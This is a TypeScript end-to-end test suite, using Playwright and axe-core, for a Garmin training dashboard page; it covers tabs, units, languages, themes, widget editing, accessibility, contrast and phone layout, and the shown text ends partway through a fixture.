import { readFileSync, statSync, writeFileSync } from "node:fs";
import axe from "axe-core";
import type { Browser, Page } from "playwright-core";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { THEMES } from "../../src/page/theme";
import { DASHBOARD_VERSION } from "../../src/prompts";
import { data, launch, open, pageFile } from "./page";

let browser: Browser;
beforeAll(async () => {
  browser = await launch();
});
afterAll(async () => {
  await browser?.close();
});

const tabs = (page: Page) =>
  page.$$eval("[role=tab]", (els) =>
    els.map((e) => [e.getAttribute("data-tab"), e.querySelector(".count")?.textContent]),
  );
const tiles = (page: Page) =>
  page.$$eval(".tile", (els) => els.map((e) => (e as HTMLElement).dataset.id));
/** The "Average pace" value of the running board for the given activities. */
async function runningPace(activities: unknown[]): Promise<string | null> {
  const { page } = await open(
    browser,
    pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities } }),
    {
      hash: "#running",
    },
  );
  return page
    .locator("[data-id=typeKpis] .kpi", {
      has: page.locator(".kpi-label", { hasText: "Average pace" }),
    })
    .locator(".kpi-value")
    .textContent();
}
const hash = (page: Page) => page.evaluate(() => location.hash);
/** Opens edit mode from the settings menu. */
async function startEdit(page: Page): Promise<void> {
  await page.click(".account summary");
  await page.click(".account-panel >> text=Edit layout");
}

const ALL_PRESET = [
  "kpis",
  "readiness",
  "calendar",
  "periodComparison",
  "records",
  "weeklyVolume",
  "intensityMinutes",
  "loadSafety",
  "loadVsRecovery",
  "activities",
  "coachNotes",
];

/** Hovers a real data point of every visible chart; returns the ids of the charts without a tooltip. */
async function chartsWithoutTooltip(page: Page): Promise<string[]> {
  const keys = await page.evaluate(() =>
    Object.values(window.Chart!.instances)
      .filter((c) => c.canvas.offsetParent)
      .map((c, i) => {
        c.canvas.dataset.probe = String(i);
        return String(i);
      }),
  );
  const missing: string[] = [];
  for (const key of keys) {
    const pos = await page.evaluate((k) => {
      const c = Object.values(window.Chart!.instances).find((x) => x.canvas.dataset.probe === k)!;
      c.canvas.scrollIntoView({ block: "center" });
      for (let d = 0; d < c.data.datasets.length; d++) {
        const meta = c.getDatasetMeta(d);
        const i = meta.data.findIndex(
          (p) =>
            p && !(p as { skip?: boolean }).skip && Number.isFinite(p.x) && Number.isFinite(p.y),
        );
        if (i >= 0) {
          const r = c.canvas.getBoundingClientRect();
          return { x: r.left + meta.data[i].x, y: r.top + meta.data[i].y };
        }
      }
      return null;
    }, key);
    if (!pos) continue;
    await page.mouse.move(pos.x, pos.y);
    await page.waitForTimeout(80);
    const shown = await page.evaluate(
      (k) =>
        Object.values(window.Chart!.instances)
          .find((x) => x.canvas.dataset.probe === k)!
          .tooltip!.getActiveElements().length > 0,
      key,
    );
    if (!shown)
      missing.push(
        await page.evaluate(
          (k) =>
            Object.values(window.Chart!.instances)
              .find((x) => x.canvas.dataset.probe === k)!
              .canvas.closest(".tile")!
              .getAttribute("data-id")!,
          key,
        ),
      );
  }
  return missing;
}

/** The text of the All, Run, Strength and Bike boards of a page with these units, race names left out. */
async function shownUnits(units?: string): Promise<string> {
  const { page, errors } = await open(browser, pageFile({ data: { ...data, units } }));
  let text = "";
  for (const tab of ["all", "running", "strengthTraining", "cycling"]) {
    await page.click(`[data-tab=${tab}]`);
    text += await page.innerText("#app");
  }
  expect(errors).toEqual([]);
  // race names such as "5 km" and the 15 km long-run threshold stay metric
  return text.replaceAll(/\b(1|5|10|15) km\b/g, "");
}

describe("the page", () => {
  it("keeps the template small", () => {
    // minified, with only the Chart.js parts the page uses: Chart.js is most of it, and the page
    // code grows by about 1 KB a feature
    expect(statSync("dist/dashboard.html").size).toBeLessThan(400 * 1024);
  });

  it("shows the preset widgets of the All board and no errors", async () => {
    const { page, errors } = await open(browser, pageFile());
    expect(await page.textContent("h1")).toBe("Training + Recovery");
    expect(await page.textContent("h2.headline")).toBe(
      "Training load, recovery and progress from Garmin Connect",
    );
    expect(await tiles(page)).toEqual(ALL_PRESET);
    // the server escaped the note: it shows as text
    expect(await page.textContent(".notes li")).toBe("Load <b>1.2");
    expect(errors).toEqual([]);
  });

  it("has a tab for each type in the data, with the sessions of the window", async () => {
    const { page } = await open(browser, pageFile());
    expect(await tabs(page)).toEqual([
      ["all", "75"],
      ["recovery", undefined],
      ["running", "36"],
      ["strengthTraining", "24"],
      ["walking", "9"],
      ["cycling", "3"],
      ["racket", "3"],
    ]);
  });

  it("shows the units of the Garmin profile, and metric without them", async () => {
    const us = await shownUnits("statute_us");
    expect(us).toMatch(/\d mi\b/);
    expect(us).toMatch(/\d:\d\d\/mi\b/);
    expect(us).toMatch(/\d lb\b/);
    expect(us).not.toMatch(/\d km\b|\/km\b|km\/h|\d kg\b/);
    const metric = await shownUnits();
    expect(metric).toMatch(/\d km\b/);
    expect(metric).toMatch(/\d kg\b/);
    expect(metric).not.toMatch(/\d mi\b|\/mi\b|\d lb\b/);
  });

  it("keeps the tab and the window in the URL hash", async () => {
    const file = pageFile();
    const { page } = await open(browser, file);
    await page.click("[data-tab=running]");
    await page.focus("[data-tab=running]");
    await page.keyboard.press("ArrowRight");
    expect(await page.getAttribute("[data-tab=strengthTraining]", "aria-selected")).toBe("true");
    await page.click(".window-bar .chip >> text=Last 4");
    expect(await hash(page)).toBe("#strengthTraining@2026-10-05_2026-10-26");

    const again = await open(browser, file, { hash: "#strengthTraining@2026-10-05_2026-10-26" });
    expect(await again.page.getAttribute("[data-tab=strengthTraining]", "aria-selected")).toBe(
      "true",
    );
    expect(await again.page.inputValue("#from")).toBe("2026-10-05");
  });

  it("moves focus to the board with the skip link and keeps the view", async () => {
    const { page } = await open(browser, pageFile(), {
      hash: "#strengthTraining@2026-10-05_2026-10-26",
    });
    await page.keyboard.press("Tab"); // the skip link is the first focusable element
    await page.keyboard.press("Enter");
    expect(await hash(page)).toBe("#strengthTraining@2026-10-05_2026-10-26");
    expect(await page.evaluate(() => document.activeElement?.id)).toBe("board");
  });

  it("opens a link with a broken item", async () => {
    const { page, errors } = await open(browser, pageFile(), { hash: "#strengthTraining/%E0" });
    expect(await page.getAttribute("[data-tab=strengthTraining]", "aria-selected")).toBe("true");
    expect(errors).toEqual([]);
  });

  it("switches between the 11 themes and keeps the choice", async () => {
    const file = pageFile();
    const { page, errors } = await open(browser, file);
    const themes = await page.$$eval("#theme option", (o) =>
      o.map((x) => (x as HTMLOptionElement).value),
    );
    expect(themes).toHaveLength(11);
    expect(await page.inputValue("#theme")).toBe("midnight");
    // the menu stays open while the page renders again for each theme
    await page.click(".account summary");
    for (const theme of themes) await page.selectOption("#theme", theme);
    await page.selectOption("#theme", "paper");
    await page.keyboard.press("Escape");
    expect(await page.$(".account[open]")).toBeNull();
    await page.click(".account summary");
    await page.click("h1");
    expect(await page.$(".account[open]")).toBeNull();
    await page.reload();
    expect(await page.evaluate(() => document.documentElement.dataset.theme)).toBe("paper");
    expect(errors).toEqual([]);
  });

  it("follows the browser language, and the language menu", async () => {
    const { page } = await open(browser, pageFile({ settings: { languages: ["en", "it"] } }), {
      locale: "it-IT",
    });
    expect(await page.textContent("h1")).toBe("Allenamento + Recupero");
    expect(await page.textContent("[data-tab=running]")).toContain("Corsa");
    await page.click(".account summary");
    await page.selectOption("#lang", "en");
    expect(await page.textContent("h1")).toBe("Training + Recovery");
    expect(await page.evaluate(() => document.documentElement.lang)).toBe("en");
  });

  it("opens in the language of the Garmin profile, until the reader picks one", async () => {
    const file = pageFile({
      data: { ...data, locale: "pt-BR" },
      settings: { languages: ["en", "pt"] },
    });
    const { page } = await open(browser, file, { locale: "en-US" });
    expect(await page.evaluate(() => document.documentElement.lang)).toBe("pt");
    await page.click(".account summary");
    expect(await page.inputValue("#lang")).toBe("pt");
    await page.selectOption("#lang", "auto");
    expect(await page.evaluate(() => document.documentElement.lang)).toBe("en");
  });

  it("says when the page has no texts in the language of the Garmin profile", async () => {
    const { page, errors } = await open(browser, pageFile({ data: { ...data, locale: "ru" } }), {
      locale: "ru-RU",
    });
    expect(await page.evaluate(() => document.documentElement.lang)).toBe("en");
    await page.click(".account summary");
    expect(await page.textContent(".menu-note")).toBe(
      "Русский is not in this page yet. Ask your assistant to add it.",
    );
    expect(errors).toEqual([]);
    const pt = await open(
      browser,
      pageFile({ data: { ...data, locale: "pt-BR" }, settings: { languages: ["en", "pt"] } }),
    );
    await pt.page.click(".account summary");
    expect(await pt.page.locator(".menu-note").count()).toBe(0);
  });

  it("shows the title, the sports, the data and the menus of its settings", async () => {
    const { page, errors } = await open(
      browser,
      pageFile({
        settings: {
          title: "For my coach",
          headline: "Running block, autumn",
          sports: ["running", "cycling"],
          exclude: ["recovery", "notes"],
          languages: ["en"],
          themes: ["paper"],
          theme: "paper",
        },
      }),
      { locale: "it-IT" },
    );
    expect(await page.textContent("h1")).toBe("For my coach");
    expect(await page.title()).toBe("For my coach");
    expect(await page.textContent("h2.headline")).toBe("Running block, autumn");
    expect((await tabs(page)).map(([tab]) => tab)).toEqual(["all", "running", "cycling"]);
    expect(await tiles(page)).not.toContain("hrv");
    expect(await tiles(page)).not.toContain("coachNotes");
    // English only, one theme: no menus to choose them
    expect(await page.evaluate(() => document.documentElement.lang)).toBe("en");
    expect(await page.evaluate(() => document.documentElement.dataset.theme)).toBe("paper");
    expect(await page.$("#lang")).toBeNull();
    expect(await page.$("#theme")).toBeNull();
    expect(errors).toEqual([]);
  });

  it("shows only Italian on a page that leaves English out, also for an English browser", async () => {
    const { page, errors } = await open(browser, pageFile({ settings: { languages: ["it"] } }), {
      locale: "en-US",
    });
    expect(await page.textContent("h1")).toBe("Allenamento + Recupero");
    expect(await page.textContent("h2.headline")).toBe(
      "Carico di allenamento, recupero e progressi da Garmin Connect",
    );
    expect(await page.$("#lang")).toBeNull();
    expect(errors).toEqual([]);
  });

  it("tells in the footer when the data was written, and the days that Garmin did not give", async () => {
    const { page, errors } = await open(browser, pageFile());
    expect(await page.textContent("footer .source")).toBe(
      "Data from Garmin Connect, updated Oct 26, 2026",
    );
    expect(await page.$("footer .gap")).toBeNull();
    expect(await page.getAttribute("footer a >> text=MIT License", "href")).toContain("LICENSE");

    const failed = await open(
      browser,
      pageFile({
        data: { ...data, v: DASHBOARD_VERSION, notes: [], sync: { ...data.sync, failedDays: 2 } },
      }),
    );
    expect(await failed.page.textContent("footer .gap")).toBe(
      "Days not read from Garmin: 2 (their values show n/a)",
    );
    expect([...errors, ...failed.errors]).toEqual([]);
  });

  it("shows a message without data", async () => {
    const { page, errors } = await open(browser, pageFile({ data: null }));
    expect(await page.textContent("#app")).toContain("no data yet");
    expect(errors).toEqual([]);
  });

  it("does not scroll sideways at phone width", async () => {
    const { page } = await open(browser, pageFile(), { viewport: { width: 390, height: 844 } });
    expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(
      true,
    );
  });
});

/** The layout that this browser saved, or null. */
const saved = (page: Page) =>
  page.evaluate(() => localStorage.getItem(`garmin-layout:${location.pathname}`));

describe("edit mode", () => {
  const one = {
    rev: "r0",
    base: "preset",
    boards: { all: [{ id: "coachNotes", widget: "coachNotes", span: 3 }] },
  };
  const two = {
    rev: "r1",
    base: "preset",
    boards: {
      all: [
        { id: "coachNotes", widget: "coachNotes", span: 3 },
        { id: "x", widget: "notYet", span: 1 },
      ],
    },
  };

  it("hides a widget, and shows it again from the Add widget dialog", async () => {
    const { page } = await open(browser, pageFile({ layout: one }));
    await startEdit(page);
    await page.click("[aria-label='Hide Coach notes']");
    // a hidden widget leaves the grid; the dialog lists it
    expect(await tiles(page)).toEqual([]);
    expect(await page.textContent(".edit-bar")).toContain("Add widget · 1 hidden");
    await page.click(".edit-bar >> text=Add widget");
    await page.click("dialog >> text=Show Coach notes");
    expect(await tiles(page)).toEqual(["coachNotes"]);
    expect(await page.textContent("#announce")).toBe("Coach notes shown");
    await page.click("[aria-label='Hide Coach notes']");
    await page.click(".edit-bar >> text=Done");
    expect(await tiles(page)).toEqual([]);
    expect(await page.textContent(".board-empty")).toContain("no widgets");
  });

  it("moves a widget with the keyboard from its grip", async () => {
    const { page } = await open(browser, pageFile({ layout: two }));
    await startEdit(page);
    await page.focus("[aria-label='Move Coach notes']");
    await page.keyboard.press("Space");
    expect(await page.textContent("#announce")).toContain("Coach notes picked up, position 1 of 2");
    await page.keyboard.press("ArrowRight");
    expect(await tiles(page)).toEqual(["x", "coachNotes"]);
    expect(await focused(page)).toBe("Move Coach notes");
    await page.keyboard.press("Space");
    expect(await page.textContent("#announce")).toBe("Coach notes moved to position 2 of 2");
    expect(await focused(page)).toBe("Move Coach notes");
    // Escape puts a picked tile back, and stays in edit mode
    await page.keyboard.press("Enter");
    await page.keyboard.press("Home");
    expect(await tiles(page)).toEqual(["coachNotes", "x"]);
    await page.keyboard.press("Escape");
    expect(await tiles(page)).toEqual(["x", "coachNotes"]);
    expect(await page.$(".edit-bar")).not.toBeNull();
  });

  it("drags a widget: the tile lifts, a slot shows where it lands", async () => {
    const { page } = await open(browser, pageFile({ layout: two }));
    await startEdit(page);
    const from = (await page.locator("[aria-label='Move Coach notes']").boundingBox())!;
    await page.mouse.move(from.x + 5, from.y + 5);
    await page.mouse.down();
    const to = (await page.locator("[data-id=x]").boundingBox())!;
    await page.mouse.move(to.x + to.width * 0.75, to.y + to.height / 2, { steps: 8 });
    expect(await page.getAttribute("[data-id=coachNotes]", "class")).toContain("lifted");
    // the slot is after x: where the tile lands
    expect(
      await page.$eval(".tile-slot", (s) => (s.previousElementSibling as HTMLElement).dataset.id),
    ).toBe("x");
    await page.mouse.up();
    expect(await page.$(".tile-slot")).toBeNull();
    expect(await tiles(page)).toEqual(["x", "coachNotes"]);
  });

  it("resizes a widget by its handle, snapped to the columns", async () => {
    const { page } = await open(browser, pageFile({ layout: two }));
    await startEdit(page);
    const handle = page.locator("[aria-label='Width of Coach notes']");
    expect(await handle.getAttribute("aria-valuenow")).toBe("3");
    const box = (await handle.boundingBox())!;
    const grid = (await page.locator(".grid").boundingBox())!;
    await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
    await page.mouse.down();
    // a little more than one column wide
    await page.mouse.move(grid.x + grid.width * 0.4, box.y + box.height / 2, { steps: 6 });
    expect(await page.textContent(".span-badge")).toBe("1 / 3");
    expect(await page.$$eval(".guides > div", (d) => d.length)).toBe(3);
    await page.mouse.up();
    expect(await page.$(".guides")).toBeNull();
    expect(await page.getAttribute("[data-id=coachNotes]", "class")).toContain("span-1");
    // from the keyboard, the handle is a slider
    await handle.focus();
    await page.keyboard.press("ArrowRight");
    expect(await handle.getAttribute("aria-valuenow")).toBe("2");
    expect(await handle.getAttribute("aria-valuetext")).toBe("2 of 3 columns");
    await page.keyboard.press("End");
    expect(await page.getAttribute("[data-id=coachNotes]", "class")).toContain("span-3");
  });

  it("ends a drag when the page draws again during it", async () => {
    const { page } = await open(browser, pageFile({ layout: two }));
    await startEdit(page);
    const from = (await page.locator("[aria-label='Move Coach notes']").boundingBox())!;
    await page.mouse.move(from.x + 5, from.y + 5);
    await page.mouse.down();
    const to = (await page.locator("[data-id=x]").boundingBox())!;
    await page.mouse.move(to.x + to.width * 0.75, to.y + to.height / 2, { steps: 8 });
    expect(await page.evaluate(() => document.documentElement.classList.contains("dragging"))).toBe(
      true,
    );
    await page.evaluate(() => window.dispatchEvent(new HashChangeEvent("hashchange")));
    await page.waitForFunction(() => !document.documentElement.classList.contains("dragging"));
    expect(await page.$(".tile-slot")).toBeNull();
    await page.mouse.up();
  });

  it("ends a resize when the page draws again during it", async () => {
    const { page } = await open(browser, pageFile({ layout: two }));
    await startEdit(page);
    const box = (await page.locator("[aria-label='Width of Coach notes']").boundingBox())!;
    const grid = (await page.locator(".grid").boundingBox())!;
    await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
    await page.mouse.down();
    await page.mouse.move(grid.x + grid.width * 0.4, box.y + box.height / 2, { steps: 6 });
    expect(await page.evaluate(() => document.documentElement.classList.contains("resizing"))).toBe(
      true,
    );
    await page.evaluate(() => window.dispatchEvent(new HashChangeEvent("hashchange")));
    await page.waitForFunction(() => !document.documentElement.classList.contains("resizing"));
    expect(await page.$(".guides")).toBeNull();
    await page.mouse.up();
  });

  it("keeps a widget at its narrowest width", async () => {
    const { page } = await open(browser, pageFile());
    await startEdit(page);
    const handle = page.locator("[aria-label='Width of Activities']");
    expect(await handle.getAttribute("aria-valuemin")).toBe("2");
    await handle.focus();
    await page.keyboard.press("Home");
    expect(await page.getAttribute("[data-id=activities]", "class")).toContain("span-2");
  });

  it("removes a widget, adds it back from the catalogue, and resets to the preset", async () => {
    const { page } = await open(browser, pageFile({ layout: two }));
    await startEdit(page);
    await page.click("[aria-label='Hide Coach notes']");
    await page.click(".edit-bar >> text=Add widget");
    await page.click("dialog >> text=Remove Coach notes");
    expect(await tiles(page)).toEqual(["x"]);
    expect(await page.textContent(".edit-bar")).not.toContain("hidden");
    await page.click("text=Add widget");
    await page.click(".catalogue li:has-text('Coach notes') button");
    expect(await tiles(page)).toEqual(["x", "coachNotes"]);
    await page.click("text=Reset board");
    await page.click("text=Done");
    expect(await tiles(page)).toEqual(ALL_PRESET);
  });

  it("keeps a browser edit after a reload, until the page gets a new layout", async () => {
    const file = pageFile({ layout: two });
    const { page } = await open(browser, file);
    await startEdit(page);
    await page.click("[aria-label='Hide Coach notes']");
    await page.click("text=Done");
    await page.reload();
    await page.waitForSelector(".page");
    expect(await tiles(page)).toEqual([]);

    // Claude saved another layout into the same page: a new rev, so the page layout wins
    writeFileSync(file, readFileSync(file, "utf8").replace('"rev":"r1"', '"rev":"r2"'));
    await page.reload();
    await page.waitForSelector(".page");
    // the page layout has the notes and a widget that does not exist yet
    expect(await tiles(page)).toEqual(["coachNotes"]);
    // and the page offers the layout of this browser back
    expect(await page.textContent(".banner")).toContain("Your assistant wrote a new layout");
    await page.click(".banner >> text=Keep mine");
    expect(await tiles(page)).toEqual([]);
    expect(await page.$(".banner")).toBeNull();
    await page.reload();
    await page.waitForSelector(".page");
    expect(await tiles(page)).toEqual([]);
    expect(await page.$(".banner")).toBeNull();
  });

  it("saves the edits only on Done", async () => {
    const { page } = await open(browser, pageFile({ layout: two }));
    await startEdit(page);
    await page.focus("[aria-label='Move Coach notes']");
    for (const key of ["Space", "ArrowRight", "Space"]) await page.keyboard.press(key);
    expect(await page.textContent(".edit-bar")).toContain("Unsaved changes");
    expect(await saved(page)).toBeNull();
    await page.click(".edit-bar >> text=Done");
    expect(
      JSON.parse((await saved(page))!).layout.boards.all.map((i: { id: string }) => i.id),
    ).toEqual(["x", "coachNotes"]);
    expect(await page.textContent("#announce")).toBe("Layout saved");
    expect(await focused(page)).toBe("Settings");
  });

  it("asks before it discards the edits, and puts the layout back", async () => {
    const { page } = await open(browser, pageFile({ layout: two }));
    await startEdit(page);
    await page.click("[aria-label='Hide Coach notes']");
    await page.click(".edit-bar >> text=Discard");
    await page.click("dialog >> text=Keep editing");
    expect(await tiles(page)).toEqual(["x"]);
    await page.keyboard.press("Escape"); // Escape is Discard too
    await page.click("dialog >> text=Discard changes");
    expect(await page.$(".edit-bar")).toBeNull();
    expect(await tiles(page)).toEqual(["coachNotes"]);
    expect(await saved(page)).toBeNull();
  });

  it("leaves edit mode without a question when nothing changed", async () => {
    const { page } = await open(browser, pageFile({ layout: two }));
    await startEdit(page);
    await page.keyboard.press("Escape");
    expect(await page.$(".edit-bar")).toBeNull();
    expect(await page.$("dialog")).toBeNull();
  });

  it("keeps the edit bar in view while you scroll", async () => {
    const { page } = await open(browser, pageFile());
    await startEdit(page);
    await page.evaluate(() => window.scrollTo(0, 2000));
    const top = await page.$eval(".edit-bar", (el) => el.getBoundingClientRect().top);
    expect(top).toBe(0);
  });

  it("uses the new layout from Claude when you choose it", async () => {
    const file = pageFile({ layout: two });
    const { page } = await open(browser, file);
    await startEdit(page);
    await page.click("[aria-label='Hide Coach notes']");
    await page.click("text=Done");
    writeFileSync(file, readFileSync(file, "utf8").replace('"rev":"r1"', '"rev":"r2"'));
    await page.reload();
    await page.waitForSelector(".page");
    await page.click(".banner >> text=Use the new one");
    expect(await page.$(".banner")).toBeNull();
    expect(await page.textContent("#announce")).toBe("The new layout is in use");
    await page.reload();
    await page.waitForSelector(".page");
    expect(await tiles(page)).toEqual(["coachNotes"]);
    expect(await page.$(".banner")).toBeNull();
  });

  it("copies the layout as text that Claude can save", async () => {
    const { page } = await open(browser, pageFile({ layout: two }));
    await startEdit(page);
    await page.click("text=Copy layout");
    const text = await page.inputValue(".layout-text");
    expect(JSON.parse(text)).toEqual({ base: "preset", boards: two.boards });
  });

  it("starts empty on a blank layout", async () => {
    const { page } = await open(
      browser,
      pageFile({ layout: { rev: "b", base: "blank", boards: {} } }),
    );
    expect(await tiles(page)).toEqual([]);
    // an empty board has its own way into edit mode
    expect(await page.textContent(".board-empty")).toContain("no widgets");
    await page.click(".board-empty >> text=Edit layout");
    expect(await page.$(".edit-bar")).not.toBeNull();
    expect(await page.textContent(".board-empty")).toContain("Add widget");
  });

  it("opens edit mode from the settings menu, and closes the menu", async () => {
    const { page } = await open(browser, pageFile());
    expect(await page.$(".menus > .btn")).toBeNull();
    await startEdit(page);
    expect(await page.$(".account[open]")).toBeNull();
    expect(await page.$(".account-panel .edit-start")).toBeNull();
    expect(await focused(page)).toBe("Add widget");
  });
});

it("uses only the synthetic fixture", () => {
  expect(data.activities.every((a: { name: string }) => !/\d{5,}/.test(a.name))).toBe(true);
});

/** Clicks legend item `i` of the chart in tile `id`; returns the visible dataset labels. */
async function clickLegend(
  page: Page,
  id: string,
  i: number,
  modifier?: "Shift",
): Promise<string[]> {
  const canvas = page.locator(`[data-id=${id}] canvas`);
  await canvas.scrollIntoViewIfNeeded();
  const box = (await canvas.boundingBox())!;
  const hit = await canvas.evaluate((el, n) => {
    type Box = { left: number; top: number; width: number; height: number };
    // the item boxes are not in the Chart.js types
    const legend = window.Chart!.getChart(el as HTMLCanvasElement)!.legend as unknown as {
      legendHitBoxes: Box[];
    };
    const h = legend.legendHitBoxes[n];
    return { x: h.left + h.width / 2, y: h.top + h.height / 2 };
  }, i);
  if (modifier) await page.keyboard.down(modifier);
  await page.mouse.click(box.x + hit.x, box.y + hit.y);
  if (modifier) await page.keyboard.up(modifier);
  // Chart.js handles events on the next animation frame
  await page.evaluate(
    () => new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r))),
  );
  return canvas.evaluate((el) => {
    const c = window.Chart!.getChart(el as HTMLCanvasElement)!;
    return c.data.datasets.filter((_, n) => c.isDatasetVisible(n)).map((d) => String(d.label));
  });
}

/** The focused element: its aria-label, else its id, else its text. */
const focused = (page: Page) =>
  page.evaluate(() => {
    const el = document.activeElement as HTMLElement;
    return el.getAttribute("aria-label") ?? (el.id || el.textContent?.trim());
  });

/** The serious and critical WCAG 2.2 AA problems that axe finds on the page now. */
async function problems(page: Page): Promise<string[]> {
  if (!(await page.evaluate(() => "axe" in window)))
    await page.addScriptTag({ content: axe.source });
  return page.evaluate(async () => {
    const r = await (window as unknown as { axe: typeof axe }).axe.run(document, {
      runOnly: { type: "tag", values: ["wcag2a", "wcag2aa", "wcag21aa", "wcag22aa"] },
    });
    return r.violations
      .filter((v) => v.impact === "serious" || v.impact === "critical")
      .map((v) => `${v.id}: ${v.nodes.length}`);
  });
}

describe("accessibility", () => {
  it("has no serious problem on the boards, in edit mode and in a light theme", async () => {
    const { page } = await open(browser, pageFile());
    for (const tab of ["all", "recovery", "running", "strengthTraining"]) {
      await page.click(`[data-tab=${tab}]`);
      expect([tab, await problems(page)]).toEqual([tab, []]);
    }
    await page.click("[data-tab=all]");
    await startEdit(page);
    expect(["edit", await problems(page)]).toEqual(["edit", []]);
    await page.click(".edit-bar >> text=Done");
    await page.click(".account summary");
    await page.focus("#theme");
    await page.selectOption("#theme", "light");
    expect(["light", await problems(page)]).toEqual(["light", []]);
  });
});

describe("calendar contrast", () => {
  it("has a calendar focus ring and day borders with 3:1 contrast in every theme", async () => {
    const { page } = await open(browser, pageFile());
    const failures: string[] = [];
    // :focus-visible on a script focus needs keyboard modality
    await page.keyboard.press("Tab");
    for (const { id } of THEMES) {
      const out = await page.evaluate((theme) => {
        document.documentElement.dataset.theme = theme;
        // colours as the browser draws them: a 1 px canvas turns any CSS colour into RGB
        const ctx2d = document.createElement("canvas").getContext("2d")!;
        const ratio = (a: string, b: string) => {
          const [x, y] = [a, b]
            .map((css) => {
              ctx2d.fillStyle = css;
              ctx2d.fillRect(0, 0, 1, 1);
              return [...ctx2d.getImageData(0, 0, 1, 1).data]
                .slice(0, 3)
                .map((v) => {
                  const c = v / 255;
                  return c <= 0.03928 ? c / 12.92 : ((c + 0.055) / 1.055) ** 2.4;
                })
                .reduce((sum, c, i) => sum + c * [0.2126, 0.7152, 0.0722][i], 0);
            })
            .toSorted((p, q) => q - p);
          return (x + 0.05) / (y + 0.05);
        };
        const cells = [...document.querySelectorAll<HTMLElement>("[data-id=calendar] .cal-cell")];
        const busy =
          cells.find((c) => c.classList.contains("l4")) ??
          cells.find((c) => c.classList.contains("l3"))!;
        const rest = cells.find((c) => c.classList.contains("l0") && c.dataset.date)!;
        const probe = document.createElement("div");
        probe.style.background = "var(--panel)";
        document.body.append(probe);
        const tile = getComputedStyle(probe).backgroundColor;
        probe.remove();
        busy.focus();
        const cs = getComputedStyle(busy);
        const edge = getComputedStyle(rest);
        const shadow = /(?:rgba?|color)\([^)]*\)/.exec(edge.boxShadow)?.[0];
        return {
          focusable: busy.matches(":focus-visible"),
          restVsTile: ratio(shadow ?? edge.backgroundColor, tile),
          // the ring borders the panel-coloured gap that the focus rule draws
          ringVsGap: ratio(cs.outlineColor, tile),
        };
      }, id);
      if (out.ringVsGap < 3) failures.push(`${id}: ring vs gap ${out.ringVsGap.toFixed(2)}`);
      if (!out.focusable) failures.push(`${id}: day not :focus-visible`);
      if (out.restVsTile < 3) failures.push(`${id}: rest day vs tile ${out.restVsTile.toFixed(2)}`);
    }
    expect(failures).toEqual([]);
  });
});

describe("phone", () => {
  const phone = { viewport: { width: 390, height: 844 } };

  it("folds the week window into one control", async () => {
    const { page } = await open(browser, pageFile(), phone);
    expect(await page.isVisible(".window-bar")).toBe(false);
    expect(await page.textContent(".window-toggle")).toBe("Weeks: All ▾");
    await page.click(".window-toggle");
    expect(await page.getAttribute(".window-toggle", "aria-expanded")).toBe("true");
    await page.click(".window-bar .chip >> text=Last 4");
    expect(await page.textContent(".window-toggle")).toBe("Weeks: Last 4 ▾");
  });

  it("keeps the header at the top, and fades the tabs that are out of view", async () => {
    const { page } = await open(browser, pageFile(), phone);
    expect(await page.getAttribute(".tabs", "class")).toContain("more");
    await page.evaluate(() => window.scrollTo(0, 2000));
    expect(await page.$eval(".top", (el) => el.getBoundingClientRect().top)).toBe(0);
    await page.$eval(".tabs", (el) => el.scrollTo({ left: el.scrollWidth }));
    await page.waitForFunction(() => !document.querySelector(".tabs")!.classList.contains("more"));
  });

  it("shows the whole week window on a desktop", async () => {
    const { page } = await open(browser, pageFile());
    expect(await page.isVisible(".window-bar")).toBe(true);
    expect(await page.isVisible(".window-toggle")).toBe(false);
  });
});

describe("focus", () => {
  it("stays on a window preset and on the theme menu after the page draws again", async () => {
    const { page } = await open(browser, pageFile());
    await page.focus(".window-bar .chip >> text=Last 8");
    await page.keyboard.press("Enter");
    expect(await focused(page)).toBe("Last 8");
    await page.click(".account summary");
    await page.focus("#theme");
    await page.selectOption("#theme", "light");
    expect(await focused(page)).toBe("theme");
  });

  it("stays on an edit tool, and says what changed", async () => {
    const { page } = await open(browser, pageFile());
    await startEdit(page);
    await page.focus("[aria-label='Move Weekly volume']");
    for (const key of ["Space", "ArrowRight", "Space"]) await page.keyboard.press(key);
    expect(await focused(page)).toBe("Move Weekly volume");
    expect(await page.textContent("#announce")).toBe("Weekly volume moved to position 7 of 11");
    // a hidden tile gives focus to the tile in its place
    await page.focus("[aria-label='Hide Weekly volume']");
    await page.keyboard.press("Enter");
    expect(await focused(page)).toBe("Hide Load safety");
    expect(await page.textContent("#announce")).toBe("Weekly volume hidden");
  });

  it("stays on an exercise chip of the Strength board", async () => {
    const { page } = await open(browser, pageFile(), { hash: "#strengthTraining" });
    const chip = ".ex-tools .chip >> nth=1";
    const name = await page.textContent(chip);
    await page.focus(chip);
    await page.keyboard.press("Enter");
    expect(await focused(page)).toBe(name);
  });

  it("closes the settings menu when focus leaves it", async () => {
    const { page } = await open(browser, pageFile());
    await page.click(".account summary");
    await page.focus("#theme");
    await page.keyboard.press("Tab");
    expect(await page.$(".account[open]")).toBeNull();
  });
});

describe("chart legends", () => {
  it("shows only the clicked series, and all of them on a second click", async () => {
    const { page, errors } = await open(browser, pageFile(), { hash: "#recovery" });
    // the legend of the HRV chart: band, nightly, 7-day average; the band's low edge is not in it
    expect(await clickLegend(page, "hrv", 1)).toEqual(["Range low", "Nightly HRV"]);
    expect(await clickLegend(page, "hrv", 1)).toEqual([
      "Range low",
      "Balanced range",
      "Nightly HRV",
      "7-day average",
    ]);
    expect(errors).toEqual([]);
  });

  it("hides just the clicked series with Shift", async () => {
    const { page } = await open(browser, pageFile(), { hash: "#recovery" });
    expect(await clickLegend(page, "hrv", 1, "Shift")).toEqual([
      "Range low",
      "Balanced range",
      "7-day average",
    ]);
  });
});

describe("overview widgets", () => {
  it("shows a tooltip on every chart", async () => {
    const { page, errors } = await open(browser, pageFile());
    expect(await page.evaluate(() => Object.keys(window.Chart!.instances).length)).toBeGreaterThan(
      3,
    );
    expect(await chartsWithoutTooltip(page)).toEqual([]);
    expect(errors).toEqual([]);
  });

  it("leaves a session without a distance out of the average pace", async () => {
    const treadmill = {
      id: 9100,
      name: "Treadmill without a foot pod",
      type: "treadmill_running",
      sport: "running",
      start: "2026-10-25 07:00:00",
      duration: "1:00:00",
